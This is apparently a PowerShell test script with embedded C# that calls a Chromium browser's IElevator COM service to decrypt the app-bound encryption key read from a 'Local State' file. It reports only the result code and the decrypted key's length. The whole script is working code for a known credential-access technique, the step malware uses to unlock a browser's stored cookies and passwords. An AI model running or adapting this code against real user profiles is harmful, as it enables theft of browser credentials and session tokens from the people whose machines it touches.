$code = @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

[ComImport]
[Guid("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface IElevator {
    [PreserveSig]
    int RunRecoveryCRXElevation(
        [MarshalAs(UnmanagedType.LPWStr)] string crx_path,
        [MarshalAs(UnmanagedType.LPWStr)] string browser_appid,
        [MarshalAs(UnmanagedType.LPWStr)] string browser_version,
        [MarshalAs(UnmanagedType.LPWStr)] string session_id,
        uint caller_proc_id,
        out IntPtr proc_handle
    );

    [PreserveSig]
    int EncryptData(
        int level,
        [MarshalAs(UnmanagedType.BStr)] string plaintext,
        [MarshalAs(UnmanagedType.BStr)] out string ciphertext,
        out uint last_error
    );

    [PreserveSig]
    int DecryptData(
        [MarshalAs(UnmanagedType.BStr)] string ciphertext,
        [MarshalAs(UnmanagedType.BStr)] out string plaintext,
        out uint last_error
    );
}

public class ElevTest {
    [DllImport("oleaut32.dll", SetLastError = true)]
    public static extern IntPtr SysAllocStringByteLen(byte[] str, uint len);

    [DllImport("oleaut32.dll")]
    public static extern uint SysStringByteLen(IntPtr bstr);

    [DllImport("oleaut32.dll")]
    public static extern void SysFreeString(IntPtr bstr);

    public static void TestDecrypt(byte[] rawCiphertext) {
        Guid clsid = new Guid("{708860E0-F641-4611-8895-7D867DD3675B}");
        Type t = Type.GetTypeFromCLSID(clsid);
        object comObj = Activator.CreateInstance(t);
        IElevator elevator = (IElevator)comObj;

        // Convert byte array to BSTR with SysAllocStringByteLen
        IntPtr bstrIn = SysAllocStringByteLen(rawCiphertext, (uint)rawCiphertext.Length);
        string cipherStr = Marshal.PtrToStringBSTR(bstrIn);
        SysFreeString(bstrIn);

        string plainStr;
        uint lastError;
        int hr = elevator.DecryptData(cipherStr, out plainStr, out lastError);
        Console.WriteLine(string.Format("DecryptData HRESULT: 0x{0:X8}, LastError: {1}", hr, lastError));
        if (hr == 0 && plainStr != null) {
            IntPtr bstrOut = Marshal.StringToBSTR(plainStr);
            uint outLen = SysStringByteLen(bstrOut);
            Console.WriteLine("SUCCESS! Decrypted key byte length: " + outLen);
            SysFreeString(bstrOut);
        }
    }
}
"@
Add-Type -TypeDefinition $code

# Read Local State
$json = Get-Content "C:\code\Chat-Codex\inspect_live\Local State" -Raw | ConvertFrom-Json
$b64 = $json.os_crypt.app_bound_encrypted_key
$bytes = [Convert]::FromBase64String($b64)
# Strip "APPB" header (4 bytes)
$cipher = $bytes[4..($bytes.Length - 1)]
Write-Host "Calling ElevTest::TestDecrypt with cipher length $($cipher.Length)..."
[ElevTest]::TestDecrypt($cipher)
